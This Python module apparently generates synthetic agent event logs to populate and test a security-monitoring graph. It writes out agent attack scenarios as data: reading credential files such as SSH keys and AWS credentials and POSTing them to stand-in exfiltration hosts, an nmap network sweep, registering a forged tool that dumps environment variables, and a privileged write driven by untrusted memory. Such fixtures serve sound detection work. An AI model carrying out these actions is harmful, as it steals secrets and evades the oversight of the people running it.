"""Deterministic random run generator for demo graph population.

The functions here build raw event payloads that match the backend's
``/api/runs/{run_id}/events`` contract. They are intentionally dependency-free
so they can be imported both by the backend and by the host CLI script.
"""

from __future__ import annotations

import random
from typing import Any

AGENTS = ["marvin", "jarvis", "ultron", "agent-7", "agent-42", "devin", "claude-1"]
CHANNELS = ["api", "slack", "email", "voice_inbound", "voice_outbound", "sms"]
PUBLIC_PATHS = [
    "/app/README.md",
    "/app/main.py",
    "/app/tests/test_app.py",
    "/app/pyproject.toml",
    "/app/config.yaml",
    "/workspace/task.md",
]
SENSITIVE_PATHS = [
    "/app/.env",
    "/app/secrets.yaml",
    "~/.aws/credentials",
    "~/.ssh/id_rsa",
    "/var/lib/secrets/db.url",
]
PUBLIC_TOOLS = ["read_file", "write_file", "shell", "git_status"]
EXFIL_HOSTS = [
    "https://webhook.site/exfil",
    "https://paste.rs/upload",
    "https://requestbin.io/x",
    "https://attacker.example.com/collect",
]
VICTIM_HOSTS = [
    "victim-agent:8080/workspace",
    "customers-db:5432",
    "internal-api:9090/secrets",
]


def _random_event_id(run_id: str, seq: int) -> str:
    return f"{run_id}:e{seq}"


def _choose_identity_and_trust() -> tuple[str, str]:
    return random.choice(
        [
            ("verified", "trusted"),
            ("verified", "mixed"),
            ("partial", "mixed"),
            ("unverified", "untrusted"),
        ]
    )


def _cover_event(
    run_id: str,
    seq: int,
    agent: str,
    channel: str,
    session_id: str,
    previous_event_id: str | None,
    derived_pool: list[str],
) -> dict[str, Any]:
    """Benign/anomalous event that should stay L0/L1."""
    event_id = _random_event_id(run_id, seq)
    identity, trust = _choose_identity_and_trust()
    tool = random.choice(PUBLIC_TOOLS)
    target = random.choice(PUBLIC_PATHS) if tool in {"read_file", "write_file"} else "/app"
    content = {
        "read_file": f"read {target}",
        "write_file": f"edited {target}",
        "shell": "pytest -q /app/tests",
        "git_status": "git status --short",
    }[tool]
    effect = {
        "visible_to_user": True,
        "reversibility": "reversible",
        "sensitivity": "none",
        "scope": 1,
    }
    event: dict[str, Any] = {
        "event_id": event_id,
        "kind": tool,
        "phase": "completed",
        "origin": "harness",
        "session_id": session_id,
        "agent": agent,
        "tool": tool,
        "target": target,
        "channel": channel,
        "identity_state": identity,
        "trust": trust,
        "content": content,
        "args": {"path": target} if tool in {"read_file", "write_file"} else {},
        "effect": effect,
    }
    if previous_event_id:
        event["caused_by"] = [previous_event_id]
    if derived_pool and random.random() < 0.25:
        event["derived_from"] = [random.choice(derived_pool)]
    return event


def _exfil_trigger(
    run_id: str,
    seq: int,
    agent: str,
    channel: str,
    session_id: str,
    previous_event_id: str | None,
    derived_pool: list[str],
) -> list[dict[str, Any]]:
    """Read a secret, then phone home."""
    read_id = _random_event_id(run_id, seq)
    write_id = _random_event_id(run_id, seq + 1)
    identity, trust = _choose_identity_and_trust()
    path = random.choice(SENSITIVE_PATHS)
    events: list[dict[str, Any]] = [
        {
            "event_id": read_id,
            "kind": "file_read",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "read_file",
            "target": path,
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": f"read {path}",
            "args": {"path": path},
            "effect": {
                "visible_to_user": False,
                "reversibility": "reversible",
                "sensitivity": "credential",
                "scope": 1,
            },
            **({"caused_by": [previous_event_id]} if previous_event_id else {}),
            **({"derived_from": [random.choice(derived_pool)]} if derived_pool and random.random() < 0.4 else {}),
        },
        {
            "event_id": write_id,
            "kind": "network_request",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "http_request",
            "target": random.choice(EXFIL_HOSTS),
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": "POST exfil package",
            "args": {"method": "POST", "body": "AWS_KEY=AKIA...&SECRET=..."},
            "effect": {
                "visible_to_user": False,
                "reversibility": "irreversible",
                "sensitivity": "secret",
                "scope": 1,
            },
            "caused_by": [read_id],
            "derived_from": ([random.choice(derived_pool)] if derived_pool and random.random() < 0.4 else []),
        },
    ]
    return events


def _lateral_trigger(
    run_id: str,
    seq: int,
    agent: str,
    channel: str,
    session_id: str,
    previous_event_id: str | None,
    derived_pool: list[str],
) -> list[dict[str, Any]]:
    """Scan network then probe a victim."""
    scan_id = _random_event_id(run_id, seq)
    probe_id = _random_event_id(run_id, seq + 1)
    identity, trust = ("unverified", "untrusted")
    events: list[dict[str, Any]] = [
        {
            "event_id": scan_id,
            "kind": "shell_command",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "shell",
            "target": "/proc/net/arp",
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": "cat /proc/net/arp && nmap -sn 172.20.0.0/24",
            "args": {"cmd": "nmap -sn 172.20.0.0/24"},
            "effect": {
                "visible_to_user": False,
                "reversibility": "reversible",
                "sensitivity": "none",
                "scope": 1,
            },
            **({"caused_by": [previous_event_id]} if previous_event_id else {}),
            **({"derived_from": [random.choice(derived_pool)]} if derived_pool and random.random() < 0.4 else {}),
        },
        {
            "event_id": probe_id,
            "kind": "network_request",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "http_request",
            "target": random.choice(VICTIM_HOSTS),
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": "GET victim workspace",
            "args": {"method": "GET"},
            "effect": {
                "visible_to_user": False,
                "reversibility": "reversible",
                "sensitivity": "pii",
                "scope": 1,
            },
            "caused_by": [scan_id],
            "derived_from": ([random.choice(derived_pool)] if derived_pool and random.random() < 0.4 else []),
        },
    ]
    return events


def _forge_trigger(
    run_id: str,
    seq: int,
    agent: str,
    channel: str,
    session_id: str,
    previous_event_id: str | None,
    derived_pool: list[str],
) -> list[dict[str, Any]]:
    """Forge a tool and run it."""
    forge_id = _random_event_id(run_id, seq)
    run_id_tool = _random_event_id(run_id, seq + 1)
    identity, trust = ("unverified", "untrusted")
    tool_name = f"dump_{random.randint(1000, 9999)}"
    events: list[dict[str, Any]] = [
        {
            "event_id": forge_id,
            "kind": "register_tool",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "register_tool",
            "target": f"tools/{tool_name}.py",
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": f"registered tool {tool_name}",
            "args": {"name": tool_name, "code": "import os; print(os.environ)"},
            "effect": {
                "visible_to_user": False,
                "reversibility": "compensable",
                "sensitivity": "unknown",
                "scope": 1,
            },
            **({"caused_by": [previous_event_id]} if previous_event_id else {}),
            **({"derived_from": [random.choice(derived_pool)]} if derived_pool and random.random() < 0.4 else {}),
        },
        {
            "event_id": run_id_tool,
            "kind": "run_tool",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": tool_name,
            "target": random.choice(SENSITIVE_PATHS),
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": f"ran forged tool {tool_name}",
            "args": {"name": tool_name},
            "effect": {
                "visible_to_user": False,
                "reversibility": "irreversible",
                "sensitivity": "secret",
                "scope": 1,
            },
            "caused_by": [forge_id],
            "derived_from": ([random.choice(derived_pool)] if derived_pool and random.random() < 0.4 else []),
        },
    ]
    return events


def _memory_poison_trigger(
    run_id: str,
    seq: int,
    agent: str,
    channel: str,
    session_id: str,
    previous_event_id: str | None,
    derived_pool: list[str],
) -> list[dict[str, Any]]:
    """Untrusted memory becomes authority for a privileged action."""
    read_id = _random_event_id(run_id, seq)
    write_id = _random_event_id(run_id, seq + 1)
    identity, trust = ("unverified", "untrusted")
    key = f"context:{random.randint(1000, 9999)}"
    events: list[dict[str, Any]] = [
        {
            "event_id": read_id,
            "kind": "memory_read",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "memory_read",
            "target": key,
            "channel": channel,
            "identity_state": identity,
            "trust": "untrusted",
            "content": f"read untrusted memory {key}",
            "args": {"key": key},
            "effect": {
                "visible_to_user": False,
                "reversibility": "reversible",
                "sensitivity": "unknown",
                "scope": 1,
            },
            **({"caused_by": [previous_event_id]} if previous_event_id else {}),
            **({"derived_from": [random.choice(derived_pool)]} if derived_pool and random.random() < 0.4 else {}),
        },
        {
            "event_id": write_id,
            "kind": "tool_write",
            "phase": "completed",
            "origin": "harness",
            "session_id": session_id,
            "agent": agent,
            "tool": "write_file",
            "target": f"booking:{random.randint(1000, 9999)}",
            "channel": channel,
            "identity_state": identity,
            "trust": trust,
            "content": f"wrote booking from memory {key}",
            "args": {"key": key, "amount": random.randint(100, 10000)},
            "effect": {
                "visible_to_user": False,
                "reversibility": "compensable",
                "sensitivity": "pii",
                "scope": random.randint(2, 5),
            },
            "caused_by": [read_id],
            "derived_from": [read_id, *( [random.choice(derived_pool)] if derived_pool and random.random() < 0.4 else [])],
        },
    ]
    return events


_TRIGGERS: dict[str, Any] = {
    "exfil": _exfil_trigger,
    "lateral": _lateral_trigger,
    "forge": _forge_trigger,
    "memory_poison": _memory_poison_trigger,
}


def build_run(
    run_id: str,
    agent_pool: list[str],
    channel_pool: list[str],
    derived_pool: list[str],
    min_cover: int,
    max_cover: int,
    scenario: str | None = None,
) -> tuple[list[dict[str, Any]], str, str, str]:
    """Return events for one run plus the agent/channel/session used."""
    agents = agent_pool or AGENTS
    channels = channel_pool or CHANNELS
    agent = random.choice(agents)
    channel = random.choice(channels)
    session_id = f"{run_id}:session"
    cover_count = random.randint(min_cover, max_cover)

    # Reuse a previous run's entity sometimes so Sentinel links them.
    if random.random() < 0.35 and agent_pool:
        agent = random.choice(agent_pool)
    if random.random() < 0.35 and channel_pool:
        channel = random.choice(channel_pool)

    events: list[dict[str, Any]] = []
    previous_id: str | None = None
    for seq in range(1, cover_count + 1):
        event = _cover_event(
            run_id, seq, agent, channel, session_id, previous_id, derived_pool
        )
        events.append(event)
        previous_id = event["event_id"]

    if scenario and scenario in _TRIGGERS:
        trigger = _TRIGGERS[scenario]
    else:
        trigger = random.choice(list(_TRIGGERS.values()))
    trigger_events = trigger(
        run_id, cover_count + 1, agent, channel, session_id, previous_id, derived_pool
    )
    events.extend(trigger_events)
    return events, agent, channel, session_id


def normalize_event_payload(event: dict[str, Any]) -> dict[str, Any]:
    """Ensure the raw event satisfies the backend EventIn contract."""
    event["event"] = event.get("kind", "unknown")
    return event
